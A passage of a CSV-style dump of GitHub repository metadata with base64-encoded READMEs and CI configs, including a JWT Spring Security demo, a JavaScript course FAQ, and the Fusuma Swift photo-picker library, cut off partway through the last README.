",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCm9zeF9pbWFnZTogeGNvZGU5CnNjcmlw
dDoKICAgIC0geGNvZGVidWlsZCAtcHJvamVjdCBTVFBvcHVwLnhjb2RlcHJv
aiAtc2NoZW1lIFNUUG9wdXAgLXNkayBpcGhvbmVzaW11bGF0b3IK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'jwt-spring-security-demo',54335585,b'A demo for using JWT (Json Web Token) with Spring Security and Spring Boot 2',b'Java',0,2379,,2379,False,b'https://api.github.com/repos/szerhusenBC/jwt-spring-security-demo/forks',"IyBKV1QgU3ByaW5nIFNlY3VyaXR5IERlbW8KCiFbU2NyZWVuc2hvdCBmcm9t
IHJ1bm5pbmcgYXBwbGljYXRpb25dKGV0Yy9zY3JlZW5zaG90LWp3dC1zcHJp
bmctc2VjdXJpdHktZGVtby5wbmc/cmF3PXRydWUgIlNjcmVlbnNob3QgSldU
IFNwcmluZyBTZWN1cml0eSBEZW1vIikKCiMjIEFib3V0ClRoaXMgaXMgYSBk
ZW1vIGZvciB1c2luZyAqKltKV1QgKEpTT04gV2ViIFRva2VuKV0oaHR0cHM6
Ly9qd3QuaW8pKiogd2l0aCAqKltTcHJpbmcgU2VjdXJpdHldKGh0dHBzOi8v
c3ByaW5nLmlvL3Byb2plY3RzL3NwcmluZy1zZWN1cml0eSkqKiBhbmQKKipb
U3ByaW5nIEJvb3RdKGh0dHBzOi8vc3ByaW5nLmlvL3Byb2plY3RzL3Nwcmlu
Zy1ib290KSoqLiBJIGNvbXBsZXRlbHkgcmV3cm90ZSBteSBmaXJzdCB2ZXJz
aW9uLiBOb3cgdGhpcyBzb2x1dGlvbiBpcyBiYXNlZCBvbiB0aGUgY29kZSBi
YXNlCmZyb20gdGhlIFtKSGlwc3RlciBQcm9qZWN0XShodHRwczovL3d3dy5q
aGlwc3Rlci50ZWNoLykuIEkgdHJpZWQgdG8gZXh0cmFjdCB0aGUgbWluaW1h
bCBjb25maWd1cmF0aW9uIGFuZCBjbGFzc2VzIHRoYXQgYXJlIG5lZWRlZCAK
Zm9yIEpXVC1BdXRoZW50aWNhdGlvbiBhbmQgZGlkIHNvbWUgY2hhbmdlcy4K
ClshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90cmF2aXMtY2kub3JnL3N6ZXJo
dXNlbkJDL2p3dC1zcHJpbmctc2VjdXJpdHktZGVtby5zdmc/YnJhbmNoPW1h
c3RlcildKGh0dHBzOi8vdHJhdmlzLWNpLm9yZy9zemVyaHVzZW5CQy9qd3Qt
c3ByaW5nLXNlY3VyaXR5LWRlbW8pCgojIyBSZXF1aXJlbWVudHMKVGhpcyBk
ZW1vIGlzIGJ1aWxkIHdpdGggd2l0aCBNYXZlbiAzLjYueCBhbmQgSmF2YSAx
MS4KCiMjIFVzYWdlCkp1c3Qgc3RhcnQgdGhlIGFwcGxpY2F0aW9uIHdpdGgg
dGhlIFNwcmluZyBCb290IG1hdmVuIHBsdWdpbiAoYG12biBzcHJpbmctYm9v
dDpydW5gKS4gVGhlIGFwcGxpY2F0aW9uIGlzCnJ1bm5pbmcgYXQgW2h0dHA6
Ly9sb2NhbGhvc3Q6ODA4MF0oaHR0cDovL2xvY2FsaG9zdDo4MDgwKS4KCllv
dSBjYW4gdXNlIHRoZSAqKkgyLUNvbnNvbGUqKiBmb3IgZXhwbG9yaW5nIHRo
ZSBkYXRhYmFzZSB1bmRlciBbaHR0cDovL2xvY2FsaG9zdDo4MDgwL2gyLWNv
bnNvbGVdKGh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9oMi1jb25zb2xlKToKCiFb
U2NyZWVuc2hvdCBmcm9tIGgyLWNvbnNvbGUgbG9naW5dKGV0Yy9zY3JlZW5z
aG90LWgyLWNvbnNvbGUtbG9naW4ucG5nP3Jhdz10cnVlICJTY3JlZW5zaG90
IEgyLUNvbnNvbGUgbG9naW4iKQoKIyMgQmFja2VuZApUaGVyZSBhcmUgdGhy
ZWUgdXNlciBhY2NvdW50cyBwcmVzZW50IHRvIGRlbW9uc3RyYXRlIHRoZSBk
aWZmZXJlbnQgbGV2ZWxzIG9mIGFjY2VzcyB0byB0aGUgZW5kcG9pbnRzIGlu
CnRoZSBBUEkgYW5kIHRoZSBkaWZmZXJlbnQgYXV0aG9yaXphdGlvbiBleGNl
cHRpb25zOgpgYGAKQWRtaW4gLSBhZG1pbjphZG1pbgpVc2VyIC0gdXNlcjpw
YXNzd29yZApEaXNhYmxlZCAtIGRpc2FibGVkOnBhc3N3b3JkICh0aGlzIHVz
ZXIgaXMgZGVhY3RpdmF0ZWQpCmBgYAoKVGhlcmUgYXJlIGZvdXIgZW5kcG9p
bnRzIHRoYXQgYXJlIHJlYXNvbmFibGUgZm9yIHRoZSBkZW1vOgpgYGAKL2Fw
aS9hdXRoZW50aWNhdGUgLSBhdXRoZW50aWNhdGlvbiBlbmRwb2ludCB3aXRo
IHVucmVzdHJpY3RlZCBhY2Nlc3MKL2FwaS91c2VyIC0gcmV0dXJucyBkZXRh
aWwgaW5mb3JtYXRpb24gZm9yIGFuIGF1dGhlbnRpY2F0ZWQgdXNlciAoYSB2
YWxpZCBKV1QgdG9rZW4gbXVzdCBiZSBwcmVzZW50IGluIHRoZSByZXF1ZXN0
IGhlYWRlcikKL2FwaS9wZXJzb25zIC0gYW4gZXhhbXBsZSBlbmRwb2ludCB0
aGF0IGlzIHJlc3RyaWN0ZWQgdG8gYXV0aG9yaXplZCB1c2VycyB3aXRoIHRo
ZSBhdXRob3JpdHkgJ1JPTEVfVVNFUicgKGEgdmFsaWQgSldUIHRva2VuIG11
c3QgYmUgcHJlc2VudCBpbiB0aGUgcmVxdWVzdCBoZWFkZXIpCi9hcGkvaGlk
ZGVubWVzc2FnZSAtIGFuIGV4YW1wbGUgZW5kcG9pbnQgdGhhdCBpcyByZXN0
cmljdGVkIHRvIGF1dGhvcml6ZWQgdXNlcnMgd2l0aCB0aGUgYXV0aG9yaXR5
ICdST0xFX0FETUlOJyAoYSB2YWxpZCBKV1QgdG9rZW4gbXVzdCBiZSBwcmVz
ZW50IGluIHRoZSByZXF1ZXN0IGhlYWRlcikKYGBgCgojIyBGcm9udGVuZApJ
J3ZlIHdyaXR0ZW4gYSBzbWFsbCBKYXZhc2NyaXB0IGNsaWVudCBhbmQgcHV0
IHNvbWUgY29tbWVudHMgaW4gdGhlIGNvZGUgdGhhdCBob3BlZnVsbHkgbWFr
ZXMgdGhpcyBkZW1vIHVuZGVyc3RhbmRhYmxlLgpZb3UgY2FuIGZpbmQgaXQg
YXQgWy9zcmMvbWFpbi9yZXNvdXJjZXMvc3RhdGljL2pzL2NsaWVudC5qc10o
L3NyYy9tYWluL3Jlc291cmNlcy9zdGF0aWMvanMvY2xpZW50LmpzKS4KCiMj
IyBHZW5lcmF0aW5nIHBhc3N3b3JkIGhhc2hlcyBmb3IgbmV3IHVzZXJzCgpJ
J20gdXNpbmcgW2JjcnlwdF0oaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dp
a2kvQmNyeXB0KSB0byBlbmNvZGUgcGFzc3dvcmRzLiBZb3VyIGNhbiBnZW5l
cmF0ZSB5b3VyIGhhc2hlcyB3aXRoIHRoaXMgc2ltcGxlIAp0b29sOiBbQmNy
eXB0IEdlbmVyYXRvcl0oaHR0cHM6Ly93d3cuYmNyeXB0LWdlbmVyYXRvci5j
b20pCgojIyMgVXNpbmcgYW5vdGhlciBkYXRhYmFzZQoKQWN0dWFsbHkgdGhp
cyBkZW1vIGlzIHVzaW5nIGFuIGVtYmVkZGVkIEgyIGRhdGFiYXNlIHRoYXQg
aXMgYXV0b21hdGljYWxseSBjb25maWd1cmVkIGJ5IFNwcmluZyBCb290LiBJ
ZiB5b3Ugd2FudCB0byBjb25uZWN0IAp0byBhbm90aGVyIGRhdGFiYXNlIHlv
dSBoYXZlIHRvIHNwZWNpZnkgdGhlIGNvbm5lY3Rpb24gaW4gdGhlICphcHBs
aWNhdGlvbi55bWwqIGluIHRoZSByZXNvdXJjZSBkaXJlY3RvcnkuIEhlcmUg
aXMgYW4gZXhhbXBsZSBmb3IgYSBNeVNRTCBEQjoKCmBgYApzcHJpbmc6CiAg
anBhOgogICAgaGliZXJuYXRlOgogICAgICAjIHBvc3NpYmxlIHZhbHVlczog
dmFsaWRhdGUgfCB1cGRhdGUgfCBjcmVhdGUgfCBjcmVhdGUtZHJvcAogICAg
ICBkZGwtYXV0bzogY3JlYXRlLWRyb3AKICBkYXRhc291cmNlOgogICAgdXJs
OiBqZGJjOm15c3FsOi8vbG9jYWxob3N0L215RGF0YWJhc2UKICAgIHVzZXJu
YW1lOiBteVVzZXIKICAgIHBhc3N3b3JkOiBteVBhc3N3b3JkCiAgICBkcml2
ZXItY2xhc3MtbmFtZTogY29tLm15c3FsLmpkYmMuRHJpdmVyCmBgYAoKKkhp
bnQ6IEZvciBvdGhlciBkYXRhYmFzZXMgbGlrZSBNeVNRTCBzZXF1ZW5jZXMg
ZG9uJ3Qgd29yayBmb3IgSUQgZ2VuZXJhdGlvbi4gU28geW91IGhhdmUgdG8g
Y2hhbmdlIHRoZSBHZW5lcmF0aW9uVHlwZSBpbiB0aGUgZW50aXR5IGJlYW5z
IHRvICdBVVRPJyBvciAnSURFTlRJVFknLioKCllvdSBjYW4gZmluZCBhIHJl
ZmVyZW5jZSBvZiBhbGwgYXBwbGljYXRpb24gcHJvcGVydGllcyBbaGVyZV0o
aHR0cDovL2RvY3Muc3ByaW5nLmlvL3NwcmluZy1ib290L2RvY3MvY3VycmVu
dC9yZWZlcmVuY2UvaHRtbC9jb21tb24tYXBwbGljYXRpb24tcHJvcGVydGll
cy5odG1sKS4KCiMjIyBVc2luZyBGbHl3YXkKCmh0dHBzOi8vZ2l0aHViLmNv
bS9zemVyaHVzZW5CQy9qd3Qtc3ByaW5nLXNlY3VyaXR5LWRlbW8vaXNzdWVz
LzgxCgojIyBEb2NrZXIKVGhpcyBwcm9qZWN0IGhhcyBhIGRvY2tlciBpbWFn
ZS4gWW91IGNhbiBmaW5kIGl0IGF0IFtodHRwczovL2h1Yi5kb2NrZXIuY29t
L3IvaHViYWUvand0LXNwcmluZy1zZWN1cml0eS1kZW1vL10oaHR0cHM6Ly9o
dWIuZG9ja2VyLmNvbS9yL2h1YmFlL2p3dC1zcHJpbmctc2VjdXJpdHktZGVt
by8pLgoKIyMgUXVlc3Rpb25zCklmIHlvdSBoYXZlIHByb2plY3QgcmVsYXRl
ZCBxdWVzdGlvbnMgcGxlYXNlIHRha2UgYSBsb29rIGF0IHRoZSBbcGFzdCBx
dWVzdGlvbnNdKGh0dHBzOi8vZ2l0aHViLmNvbS9zemVyaHVzZW5CQy9qd3Qt
c3ByaW5nLXNlY3VyaXR5LWRlbW8vaXNzdWVzP3V0Zjg9JUUyJTlDJTkzJnE9
aXMlM0Fpc3N1ZSUyMGlzJTNBb3BlbiUyQ2Nsb3NlZCUyMGxhYmVsJTNBcXVl
c3Rpb24lMjApIG9yIGNyZWF0ZSBhIG5ldyB0aWNrZXQgd2l0aCB5b3VyIHF1
ZXN0aW9uLgoKKklmIHlvdSBoYXZlIHF1ZXN0aW9ucyB0aGF0IGFyZSBub3Qg
ZGlyZWN0bHkgcmVsYXRlZCB0byB0aGlzIHByb2plY3QgKGUuZy4gY29tbW9u
IHF1ZXN0aW9ucyB0byB0aGUgU3ByaW5nIEZyYW1ld29yayBvciBTcHJpbmcg
U2VjdXJpdHkgZXRjLikgcGxlYXNlIHNlYXJjaCB0aGUgd2ViIG9yIGxvb2sg
YXQgW1N0YWNrb3ZlcmZsb3ddKGh0dHA6Ly93d3cuc3RhY2tvdmVyZmxvdy5j
b20pLioKClNvcnJ5IGZvciB0aGF0IGJ1dCBJJ20gdmVyeSBidXN5IHJpZ2h0
IG5vdyBhbmQgZG9uJ3QgaGF2ZSBtdWNoIHRpbWUuCgojIyBJbnRlcmVzdGlu
ZyBwcm9qZWN0cwoKKiBbc3ByaW5nLXNlY3VyaXR5LXBhYzRqXShodHRwczov
L2dpdGh1Yi5jb20vcGFjNGovc3ByaW5nLXNlY3VyaXR5LXBhYzRqKSBhIFNw
cmluZyBCb290IGludGVncmF0aW9uIGZvciBQYWM0aiAoYSBKYXZhIHNlY3Vy
aXR5IGVuZ2luZSB0aGF0IGNvdmVycyBKV1QgYmVzaWRlIG90aGVycykKKiBG
b3IgbW9yZSBjb21wbGV4IG1pY3Jvc2VydmljZSBlbnZpcm9ubWVudHMgdGFr
ZSBhIGxvb2sgaGVyZTogW1VzaW5nIEpXVCB3aXRoIFNwcmluZyBTZWN1cml0
eSBPQXV0aF0oaHR0cDovL3d3dy5iYWVsZHVuZy5jb20vc3ByaW5nLXNlY3Vy
aXR5LW9hdXRoLWp3dCkKCiMjIEF1dGhvcgoKKipTdGVwaGFuIFplcmh1c2Vu
KioKCiogaHR0cHM6Ly90d2l0dGVyLmNvbS9zdHplcmh1cwoqIGh0dHBzOi8v
Z2l0aHViLmNvbS9zemVyaHVzZW5CQwoKIyMgQ29weXJpZ2h0IGFuZCBsaWNl
bnNlCgpUaGUgY29kZSBpcyByZWxlYXNlZCB1bmRlciB0aGUgW01JVCBsaWNl
bnNlXShMSUNFTlNFP3Jhdz10cnVlKS4KCi0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQoKUGxlYXNlIGZlZWwgZnJlZSB0byBzZW5k
IG1lIHNvbWUgZmVlZGJhY2sgb3IgcXVlc3Rpb25zIQo=
",,"bGFuZ3VhZ2U6IGphdmEKCmpkazoKICAtIG9wZW5qZGsxMQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'paperwork',1955800,"b""Personal document manager (Linux/Windows) -- Moved to Gnome's Gitlab""",b'Python',140,2378,,2378,False,b'https://api.github.com/repos/openpaperwork/paperwork/forks',"IyBQYXBlcndvcmsgLSBbb3BlbnBhcGVyLndvcmtdKGh0dHBzOi8vb3BlbnBh
cGVyLndvcmsvKQoKTW92ZWQgdG8gW0dub21lJ3MgR2l0bGFiXShodHRwczov
L2dpdGxhYi5nbm9tZS5vcmcvV29ybGQvT3BlblBhcGVyd29yay9wYXBlcndv
cmspLgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'complete-javascript-course',137389229,"b'Starter files, final projects and FAQ for my Complete JavaScript course'",b'JavaScript',8,2378,,2378,False,b'https://api.github.com/repos/jonasschmedtmann/complete-javascript-course/forks',"IyBDb3Vyc2UgTWF0ZXJpYWwgYW5kIEZBUSBmb3IgbXkgQ29tcGxldGUgSmF2
YVNjcmlwdCBDb3Vyc2UKClRoaXMgcmVwbyBjb250YWlucyBzdGFydGVyIGZp
bGVzIGFuZCB0aGUgZmluaXNoZWQgcHJvamVjdCBmaWxlcyBmb3IgYWxsIHRo
ZSBwcm9qZWN0cyBjb250YWluZWQgaW4gdGhlIGNvdXJzZS4KClBsdXMsIEkg
bWFkZSBhbGwgdGhlIFtjb3Vyc2Ugc2xpZGVzIGF2YWlsYWJsZSBmb3IgZG93
bmxvYWRdKHNsaWRlcy1zdHVkZW50cy1DMDMucGRmKSwgdG8gbWFrZSBpdCBl
YXNpZXIgdG8gZm9sbG93IGFsb25nIHRoZSBjb25jZXB0dWFsIHZpZGVvcy4K
CvCfkYcgKipfUGxlYXNlIHJlYWQgdGhlIGZvbGxvd2luZyBGcmVxdWVudGx5
IEFza2VkIFF1ZXN0aW9ucyAoRkFRKSBjYXJlZnVsbHkgYmVmb3JlIHN0YXJ0
aW5nIHRoZSBjb3Vyc2VfKiog8J+RhwoKIyMgRkFRCgojIyMgUTE6IEhvdyBk
byBJIGRvd25sb2FkIHRoZSBmaWxlcz8KCioqQToqKiBJZiB5b3UncmUgbmV3
IHRvIEdpdEh1YiBhbmQganVzdCB3YW50IHRvIGRvd25sb2FkIHRoZSBjb21w
bGV0ZSBwYWNrYWdlLCBoaXQgdGhlIGdyZWVuIGJ1dHRvbiBzYXlpbmcgIkNs
b25lIG9yIGRvd25sb2FkIiwgY2hvb3NlIHRoZSAiRG93bmxvYWQgWklQIiBv
cHRpb24sIGFuZCB5b3UncmUgZ29vZCB0byBnby4KCiMjIyBRMjogSSdtIHN0
dWNrIGluIG9uZSBvZiB0aGUgcHJvamVjdHMuIFdoZXJlIGRvIEkgZ2V0IGhl
bHA/CgoqKkE6KiogSGF2ZSB5b3UgZXh0ZW5zaXZlbHkgdHJpZWQgZml4aW5n
IHRoZSBwcm9ibGVtIG9uIHlvdXIgb3duPyBJZiB5b3UgZmFpbGVkIGF0IGZp
eGluZyBpdCwgcGxlYXNlICoqcG9zdCBhIGRldGFpbGxlZCBkZXNjcmlwdGlv
biBvZiB0aGUgcHJvYmxlbSB0byB0aGUgUSZBIGFyZWEgb2YgdGhhdCB2aWRl
byBvdmVyIGF0IFVkZW15KiosIGFsb25nIHdpdGggYSBbY29kZXBlbl0oaHR0
cHM6Ly9jb2RlcGVuLmlvL3Blbi8pIGNvbnRhaW5pbmcgeW91ciBjb2RlLiBZ
b3Ugd2lsbCBnZXQgaGVscCBhcyBmYXN0IGFzIHBvc3NpYmxlISBQbGVhc2Ug
ZG9uJ3Qgc2VuZCBtZSBhIHBlcnNvbmFsIG1lc3NhZ2Ugb3IgZW1haWwgdG8g
Zml4IGNvZGluZyBwcm9ibGVtcy4KCiMjIyBRMzogQnJhY2tldHMgc2hvd3Mg
bWUgZXJyb3JzLCBidXQgbXkgY29kZSB3b3Jrcy4gV2h5IGlzIHRoYXQ/Cgoq
KkE6KiogVGhlc2UgYXJlIF9ub3RfIGVycm9ycyBpbiB5b3VyIGNvZGUsIGFu
ZCB5b3UgY2FuIHNpbXBseSBpZ25vcmUgdGhlbSAodGhleSBqdXN0IGNvbWUg
ZnJvbSBzby1jYWxsZWQgbGludGVycyB0aGF0IGFyZSBub3QgY29ycmVjdGx5
IHNldCB1cCkuCgojIyMgUTQ6IFlvdSBrZWVwIG1lbnRpb25pbmcgeW91ciBy
ZXNvdXJjZXMgcGFnZS4gV2hlcmUgY2FuIEkgZmluZCBpdD8KCioqQToqKiBJ
dCdzIG9uIG15IHdlYnNpdGUgYXQgPGh0dHA6Ly9jb2RpbmdoZXJvZXMuaW8v
cmVzb3VyY2VzPi4gWW91IGNhbiBzdWJzY3JpYmUgZm9yIHVwZGF0ZXMg8J+Y
iQoKIyMjIFE1OiBXaGF0IEJyYWNrZXRzIGFuZCBWU0NvZGUgdGhlbWVzIGFy
ZSB5b3UgdXNpbmc/CgoqKkE6KiogSSB1c2UgdGhlIHRoZW1lICJPUyBYIFN0
eWxlIHwgRmxhdCAmIERhcmsiIGluIEJyYWNrZXRzIGFuZCAiT2NlYW5pYyBO
ZXh0IChkaW1tZWQgYmcpIiBpbiBWU0NvZGUuIFtIZXJlIGlzIHRoZSBjb21w
bGV0ZSBzZXR1cF0oZWRpdG9ycy1zZXR1cC5tZCkuCgojIyMgUTY6IENhbiBJ
IHNlZSBhIGZpbmFsIHZlcnNpb24gb2YgdGhlIGNvdXJzZSBwcm9qZWN0cz8K
CioqQToqKiBTdXJlLCBJIGhhdmUgYW4gb25saW5lIHZlcnNpb24gb2YgYWxs
IHRocmVlLiBIZXJlIHRoZXkgYXJlOiBbUGlnIEdhbWVdKGh0dHBzOi8vcGln
Z2FtZTIubmV0bGlmeS5jb20vKSAoRE9NIG1hbmlwdWxhdGlvbiksIFtCdWRn
ZXR5XShodHRwOi8vYnVkZ2V0eTIubmV0bGlmeS5jb20vKSAoYWR2YW5jZWQg
SmF2YVNjcmlwdCkgYW5kIFtGb3JraWZ5XShodHRwczovL2ZvcmtpZnkubmV0
bGlmeS5jb20vKSAobW9kZXJuIEphdmFTY3JpcHQgYW5kIEFKQVgpLgoKIyMj
IFE3OiBWaWRlb3MgZG9uJ3QgbG9hZCwgY2FuIHlvdSBmaXggaXQ/CgoqKkE6
KiogVW5mb3J0dW5hdGVseSwgdGhlcmUgaXMgbm90aGluZyBJIGNhbiBkbyBh
Ym91dCBpdC4gVGhlIGNvdXJzZSBpcyBob3N0ZWQgb24gVWRlbXkncyBwbGF0
Zm9ybSwgYW5kIHNvbWV0aW1lcyB0aGV5IGhhdmUgc21hbGwgdGVjaG5pY2Fs
IGlzc3VlcyBsaWtlIHRoaXMgb25lLiBQbGVhc2UganVzdCBjb21lIGJhY2sg
YSBiaXQgbGF0ZXIgb3IgW2NvbnRhY3QgdGhlaXIgc3VwcG9ydCB0ZWFtXSho
dHRwczovL3N1cHBvcnQudWRlbXkuY29tL2hjL2VuLXVzKS4KCiMjIyBRODog
VmlkZW9zIGFyZSBibHVycmVkIC8gaGF2ZSBsb3cgcXVhbGl0eSwgY2FuIHlv
dSBmaXggaXQ/CgoqKkE6KiogUGxlYXNlIG9wZW4gdmlkZW8gc2V0dGluZ3Mg
YW5kIGNoYW5nZSB0aGUgcXVhbGl0eSBmcm9tICdBdXRvJyB0byBhbm90aGVy
IHZhbHVlLCBmb3IgZXhhbXBsZSA3MjBwLiBJZiB0aGF0IGRvZXNuJ3QgaGVs
cCwgcGxlYXNlIFtjb250YWN0IHRoZSBVZGVteSBzdXBwb3J0IHRlYW1dKGh0
dHBzOi8vc3VwcG9ydC51ZGVteS5jb20vaGMvZW4tdXMpLgoKIyMjIFE5OiBB
cmUgdGhlIHZpZGVvcyBkb3dubG9hZGFibGU/CgoqKkE6KiogWWVzLCBJIG1h
ZGUgYWxsIHZpZGVvcyBkb3dubG9hZGFibGUgb24gdGhlIFVkZW15IHBsYXRm
b3JtIHNvIHlvdSBjYW4gbGVhcm4gZXZlbiB3aXRob3V0IGFuIGludGVybmV0
IGNvbm5lY3Rpb24uIFRvIGRvd25sb2FkIGEgdmlkZW8sIHVzZSB0aGUgc2V0
dGluZ3MgaWNvbiBpbiB0aGUgcmlnaHQgYm90dG9tIGNvcm5lciBvZiB0aGUg
dmlkZW8gcGxheWVyLgoKIyMjIFExMDogSSBsb3ZlIHlvdXIgY291cnNlcyBh
bmQgd2FudCB0byBnZXQgdXBkYXRlcyBvbiBuZXcgY291cnNlcy4gSG93PwoK
KipBOioqIEZpcnN0LCB5b3UgY2FuIHN1YnNjcmliZSB0byBteSBlbWFpbCBs
aXN0IFthdCBteSB3ZWJzaXRlXShodHRwOi8vY29kaW5naGVyb2VzLmlvL25l
d3NsZXR0ZXIpLiBQbHVzLCBJIG1ha2UgaW1wb3J0YW50IGFubm91bmNlbWVu
dHMgb24gdHdpdHRlciBbQGpvbmFzc2NobWVkdG1hbl0oaHR0cHM6Ly90d2l0
dGVyLmNvbS9qb25hc3NjaG1lZHRtYW4pLCBzbyB5b3Ugc2hvdWxkIGRlZmlu
aXRlbHkgZm9sbG93IG1lIHRoZXJlIPCflKUKCiMjIyBRMTE6IEhvdyBkbyBJ
IGdldCBteSBjZXJ0aWZpY2F0ZSBvZiBjb21wbGV0aW9uPwoKKipBOioqIEEg
Y2VydGlmaWNhdGUgb2YgY29tcGxldGlvbiBpcyBwcm92aWRlZCBieSBVZGVt
eSBhZnRlciB5b3UgY29tcGxldGUgMTAwJSBvZiB0aGUgY291cnNlLiBBZnRl
ciBjb21wbGV0aW5nIHRoZSBjb3Vyc2UsIGp1c3QgY2xpY2sgb24gdGhlICJZ
b3VyIHByb2dyZXNzIiBpbmRpY2F0b3IgaW4gdGhlIHRvcCByaWdodC1oYW5k
IGNvcm5lciBvZiB0aGUgY291cnNlIHBhZ2UuIElmIHlvdSB3YW50IHRvIGNo
YW5nZSB5b3VyIG5hbWUgb24gdGhlIGNlcnRpZmljYXRlLCBwbGVhc2UgW2Nv
bnRhY3QgdGhlIFVkZW15IHN1cHBvcnQgdGVhbV0oaHR0cHM6Ly9zdXBwb3J0
LnVkZW15LmNvbS9oYy9lbi11cykuCgojIyMgUTEyOiBEbyB5b3UgYWNjZXB0
IHB1bGwgcmVxdWVzdHM/CgoqKkE6KiogTm8sIGZvciB0aGUgc2ltcGxlIHJl
YXNvbiB0aGF0IEkgd2FudCB0aGlzIHJlcG9zaXRvcnkgdG8gY29udGFpbiB0
aGUgX2V4YWN0XyBzYW1lIGNvZGUgdGhhdCBpcyBzaG93biBpbiB0aGUgdmlk
ZW9zLiBIb3dldmVyLCBwbGVhc2UgZmVlbCBmcmVlIHRvIGFkZCBhbiBpc3N1
ZSBpZiB5b3UgZm91bmQgb25lLgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Fusuma',50766155,b'Instagram-like photo browser and a camera feature with a few line of code in Swift.',b'Swift',24,2377,,2377,False,b'https://api.github.com/repos/ytakzk/Fusuma/forks',"IyBOT1RFOiBUaGlzIHByb2plY3QgaXMgbm8gbG9uZ2VyIG1haW50YWluZWQu
CgpXZSBoaWdobHkgcmVjb21tZW5kIFtZUEltYWdlUGlja2VyXShodHRwczov
L2dpdGh1Yi5jb20vWXVtbXlwZXRzL1lQSW1hZ2VQaWNrZXIpLgoKIyMgRnVz
dW1hCgpGdXN1bWEgaXMgYSBTd2lmdCBsaWJyYXJ5IHRoYXQgcHJvdmlkZXMg
YW4gSW5zdGFncmFtLWxpa2UgcGhvdG8gYnJvd3NlciB3aXRoIGEgY2FtZXJh
IGZlYXR1cmUgdXNpbmcgb25seSBhIGZldyBsaW5lcyBvZiBjb2RlLiAgCllv
dSBjYW4gdXNlIEZ1c3VtYSBpbnN0ZWFkIG9mIFVJSW1hZ2VQaWNrZXJDb250
cm9sbGVyLiBJdCBhbHNvIGhhcyBhIGZlYXR1cmUgdG8gdGFrZSBhIHNxdWFy
ZS1zaXplZCBwaG90by4KClshW1ZlcnNpb25dKGh0dHBzOi8vaW1nLnNoaWVs
ZHMuaW8vY29jb2Fwb2RzL3YvRnVzdW1hLnN2Zz9zdHlsZT1mbGF0KV0oaHR0
cDovL2NvY29hcG9kcy5vcmcvcG9kcy9GdXN1bWEpClshW1BsYXRmb3JtXSho
dHRwczovL2ltZy5zaGllbGRzLmlvL2NvY29hcG9kcy9wL0Z1c3VtYS5zdmc/
c3R5bGU9ZmxhdCldKGh0dHA6Ly9jb2NvYXBvZHMub3JnL3BvZHMvRnVzdW1h
KQpbIVtDSSBTdGF0dXNdKGh0dHA6Ly9pbWcuc2hpZWxkcy5pby90cmF2aXMv
eXRha3prL0Z1c3VtYS5zdmc/c3R5bGU9ZmxhdCldKGh0dHBzOi8vdHJhdmlz
LWNpLm9yZy95dGFremsvRnVzdW1hKQpbIVtDYXJ0aGFnZSBjb21wYXRpYmxl
XShodHRwczovL2ltZy5zaGllbGRzLmlvL2JhZGdlL0NhcnRoYWdlLWNvbXBh
dGlibGUtNEJDNTFELnN2Zz9zdHlsZT1mbGF0KV0oaHR0cHM6Ly9naXRodWIu
Y29tL0NhcnRoYWdlL0NhcnRoYWdlKQpbIVtjb2RlYmVhdF0oaHR0cHM6Ly9j
b2RlYmVhdC5jby9iYWRnZXMvMjg3ZmY3YjEtNGNkYS00Mzg0LTg3ODAtODhl
MWRiZmY5NWNkKV0oaHR0cHM6Ly9jb2RlYmVhdC5jby9wcm9qZWN0cy9naXRo
dWItY29tLXl0YWt6ay1mdXN1bWEpCgojIyBQcmV2aWV3CjxpbWcgc3JjPSIu
L0RlbW8vZnVzdW1hLmdpZj9yYXc9dHJ1ZSIgd2lkdGg9IjM0MHB4Ij4KCiMj
IEltYWdlcwo8aW1nIHNyYz0iLi9EZW1vL2NhbWVyYV9yb2xsLnBuZz9yYXc9
dHJ1ZSIgd2lkdGg9IjM0MHB4Ij4KPGltZyBzcmM9Ii4vRGVtby9waG90by5w
bmc/cmF3PXRydWUiIHdpZHRoPSIzNDBweCI+CgojIyBGZWF0dXJlcwotIFt4
XSBVSUltYWdlUGlja2VyQ29udHJvbGxlciBhbHRlcm5hdGl2ZQotIFt4XSBD
cm9wcGluZyBpbWFnZXMgaW4gY2FtZXJhIHJvbGwKLSBbeF0gVGFraW5nIGEg
c3F1YXJlLXNpemVkIHBob3RvIGFuZCBhIHZpZGVvIHVzaW5nIEFWRm91bmRh
dGlvbgotIFt4XSBGbGFzaDogT24gJiBPZmYgCi0gW3hdIENhbWVyYSBNb2Rl
